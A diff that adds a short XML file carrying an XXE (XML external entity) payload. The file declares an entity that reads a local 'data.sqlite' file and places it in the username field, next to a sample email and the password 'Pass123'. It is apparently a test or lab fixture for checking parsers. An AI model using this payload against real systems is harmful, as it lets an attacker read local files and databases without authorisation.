@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE user[<!ENTITY xxe SYSTEM "data.sqlite">]>
+<users>
+    <user>
+        <username>&xxe;</username>
+        <email>wick@gmail.com</email>
+        <password>Pass123</password>
+    </user>
+
+</users>
